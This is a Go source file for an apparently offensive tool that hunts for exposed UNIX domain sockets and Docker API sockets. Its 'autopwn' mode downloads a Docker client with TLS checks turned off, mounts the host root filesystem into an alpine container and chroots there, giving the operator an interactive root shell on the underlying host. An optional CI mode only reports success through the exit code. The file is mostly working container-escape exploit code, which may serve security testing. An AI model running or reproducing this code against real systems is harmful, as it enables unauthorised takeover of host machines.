package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"github.com/kr/pty"
	"github.com/tv42/httpunix"
	"golang.org/x/crypto/ssh/terminal"
)

var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr, interfacesPtr, toJsonPtr, autopwnPtr, cicdPtr *bool
var validSocks []string
var foundSock bool
var exitCode int

type IpAddress struct {
	Address string
}

type Interface struct {
	Name      string
	Addresses []IpAddress
}

func main() {
	fmt.Println("[+] Hunt 'dem Socks")
	foundSock = false
	exitCode = 0
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	pathPtr := flag.String("path", ".", "Path to Start Scanning for UNIX Domain Sockets")
	verbosePtr = flag.Bool("verbose", false, "Verbose output")
	huntSockPtr = flag.Bool("socket", true, "Hunt for Available UNIX Domain Sockets")
	huntHttpPtr = flag.Bool("http", false, "Hunt for Available UNIX Domain Sockets with HTTP")
	huntDockerPtr = flag.Bool("docker", false, "Hunt for docker.sock")
	interfacesPtr = flag.Bool("interfaces", false, "Display available network interfaces")
	toJsonPtr = flag.Bool("json", false, "Return output in JSON format")
	autopwnPtr = flag.Bool("autopwn", false, "Attempt to autopwn exposed sockets")
	cicdPtr = flag.Bool("cicd", false, "Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0")

	flag.Parse()
	var sockets, httpSockets []string

	if *huntSockPtr {
		fmt.Println("[+] Hunting Down UNIX Domain Sockets from:", *pathPtr)
		sockets, _ = getValidSockets(*pathPtr)
		for _, element := range sockets {
			fmt.Println("[*] Valid Socket: " + element)
		}
	}

	if *huntHttpPtr {
		fmt.Println("[+] Hunting Down HTTP UNIX Domain Sockets from:", *pathPtr)
		if len(sockets) == 0 {
			sockets, _ = getValidSockets(*pathPtr)
		}
		httpSockets = getHTTPEnabledSockets(sockets)
		for _, element := range httpSockets {
			fmt.Println("[*] Valid HTTP Socket: " + element)
		}
	}

	if *huntDockerPtr {
		fmt.Println("[+] Hunting Down DockerD from:", *pathPtr)
		if len(sockets) == 0 {
			sockets, _ = getValidSockets(*pathPtr)
		}
		if len(httpSockets) == 0 {
			httpSockets = getHTTPEnabledSockets(sockets)
		}
		dockerSocks := getDockerEnabledSockets(httpSockets)
		for _, element := range dockerSocks {
			fmt.Println("[*] Valid Docker Socket: " + element)
		}
	}

	if *interfacesPtr {
		err := processInterfaces()
		if err != nil {
			fmt.Println("[ERROR]", err)
		}
	}

	if !foundSock {
		if *pathPtr != "/" {
			fmt.Println("[*] No accessible sockets found,try change search path e.g -path=/")
		}
	}

	if *autopwnPtr {
		fmt.Println("[+] Attempting to autopwn")
		if len(sockets) == 0 {
			sockets, _ = getValidSockets(*pathPtr)
		}
		if len(httpSockets) == 0 {
			httpSockets = getHTTPEnabledSockets(sockets)
		}
		dockerSocks := getDockerEnabledSockets(httpSockets)
		for _, element := range dockerSocks {
			autopwn(element)
		}
	}
	fmt.Println("[+] Finished")
	os.Exit(exitCode)
}

func downloadFile(filepath string, url string) error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func execDocker(dockerSockPath string) error {
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run docker id"
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return err
	}
	if *verbosePtr {
		fmt.Printf("[*] Command Output: %s\n", string(out[:]))
	}
	exitCode = 1
	return nil
}

func dropToTTY(dockerSockPath string) error {
	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run -t -i -v /:/host alpine:latest /bin/sh"
	c := exec.Command("sh", "-c", cmd)

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return err
	}

	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.
	go func() {
		ptmx.Write([]byte("chroot /host && clear\n"))
	}()

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	go func() {
		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
	}()
	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, ptmx)
	return nil
}

func autopwn(dockerSock string) error {
	fmt.Println("[+] Attempting to Autopwn: ", dockerSock)
	fmt.Println("[*] Getting Docker client...")
	fileUrl := "https://download.docker.com/linux/static/stable/x86_64/docker-18.09.2.tgz"

	if err := downloadFile("docker-18.09.2.tgz", fileUrl); err != nil {
		return err
	}

	file, err := os.Open("docker-18.09.2.tgz")
	if err != nil {
		return err
	}
	err = untar(".", file)
	if err != nil {
		return err
	}
	fmt.Println("[*] Successfully got Docker client...")

	fmt.Println("[+] Attempting to escape to host...")

	if *cicdPtr {
		fmt.Println("[+] Attempting in CICD Mode")
		err := execDocker(dockerSock)
		if err != nil {
			return err
		}

	} else {
		fmt.Println("[+] Attempting in TTY Mode")
		err := dropToTTY(dockerSock)
		if err != nil {
			return err
		}
		fmt.Println("[*] Successfully exited TTY")
	}
	return nil
}

func untar(dst string, r io.Reader) error {
	// this code has been copy pasted from this great gist https://gist.github.com/sdomino/635a5ed4f32c93aad131#file-untargz-go
	gzr, err := gzip.NewReader(r)
	if err != nil {
		return err
	}
	defer gzr.Close()
	tr := tar.NewReader(gzr)
	for {
		header, err := tr.Next()
		switch {
		// if no more files are found return
		case err == io.EOF:
			return nil
		// return any other error
		case err != nil:
			return err
		// if the header is nil, just skip it (not sure how this happens)
		case header == nil:
			continue
		}
		// the target location where the dir/file should be created
		target := filepath.Join(dst, header.Name)
		// check the file type
		switch header.Typeflag {

		// if its a dir and it doesn't exist create it
		case tar.TypeDir:
			if _, err := os.Stat(target); err != nil {
				if err := os.MkdirAll(target, 0755); err != nil {
					return err
				}
			}
		// if it's a file create it
		case tar.TypeReg:
			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				return err
			}
			// copy over contents
			if _, err := io.Copy(f, tr); err != nil {
				return err
			}
			// manually close here after each file operation; defering would cause each file close
			// to wait until all operations have completed.
			f.Close()
		}
	}
}

func processInterfaces() error {
	fmt.Println("[+] Looking for Interfaces")
	var interfaceResults []Interface
	interfaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	for _, i := range interfaces {
		byNameInterface, err := net.InterfaceByName(i.Name)
		var result Interface
		result.Name = i.Name

		fmt.Println("[*] Got Interface: " + i.Name)
		if err != nil {
			return err
		}
		addresses, err := byNameInterface.Addrs()
		var addressResults []IpAddress
		for _, v := range addresses {
			fmt.Println("\t[*] Got address: " + v.String())
			var address IpAddress
			address.Address = v.String()
			addressResults = append(addressResults, address)
		}
		result.Addresses = addressResults
		interfaceResults = append(interfaceResults, result)
	}
	if *toJsonPtr {
		js, err := json.Marshal(interfaceResults)
		if err != nil {
			return err
		}
		fmt.Println(string(js[:]))
	}
	return nil
}

func getDockerEnabledSockets(socks []string) []string {
	fmt.Println("[+] Hunting Docker Socks")
	var dockerSocks []string
	for _, element := range socks {
		// if strings.Contains(element, "docker.sock") {
		// fmt.Println("FOUND DOCKER.SOCK")
		resp, err := checkSock(element)
		if err == nil {
			if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
				dockerSocks = append(dockerSocks, element)
				if *verbosePtr {
					fmt.Println("[+] Valid Docker Socket: " + element)
				}
			} else {
				if *verbosePtr {
					fmt.Println("[+] Invalid Docker Socket: " + element)
				}
			}
			defer resp.Body.Close()
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid Docker Socket: " + element)
			}
		}
		// }

	}
	return dockerSocks
}

func getHTTPEnabledSockets(socks []string) []string {
	var httpSocks []string
	for _, element := range socks {
		_, err := checkSock(element)
		if err == nil {
			// defer resp.Body.Close()
			httpSocks = append(httpSocks, element)
			if *verbosePtr {
				fmt.Println("[+] Valid HTTP Socket: " + element)
			}
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid HTTP Socket: " + element)
			}
		}
	}
	return httpSocks
}

func walkpath(path string, info os.FileInfo, err error) error {
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
	} else {
		switch mode := info.Mode(); {
		case mode&os.ModeSocket != 0:
			if *verbosePtr {
				fmt.Println("[+] Valid Socket: " + path)
			}
			validSocks = append(validSocks, path)
			foundSock = true
		default:
			if *verbosePtr {
				fmt.Println("[!] Invalid Socket: " + path)
			}
		}
	}
	return nil
}

func getValidSockets(startPath string) ([]string, error) {
	err := filepath.Walk(startPath, walkpath)
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
		return nil, err
	}
	return validSocks, nil
}

func checkSock(path string) (*http.Response, error) {
	if *verbosePtr {
		fmt.Println("[-] Checking Sock for HTTP: " + path)
	}

	// if strings.Contains(path, "docker.sock") {
	u := &httpunix.Transport{
		DialTimeout:           100 * time.Millisecond,
		RequestTimeout:        1 * time.Second,
		ResponseHeaderTimeout: 1 * time.Second,
	}
	u.RegisterLocation("dockerd", path)
	var client = http.Client{
		Transport: u,
	}
	resp, err := client.Get("http+unix://dockerd/info")

	if resp == nil {
		return nil, err
	}
	return resp, nil
	// }
	// return nil, nil
}

func debug(data []byte, err error) {
	if err == nil {
		fmt.Printf("%s\n\n", data)
	} else {
		log.Fatalf("%s\n\n", err)
	}
}
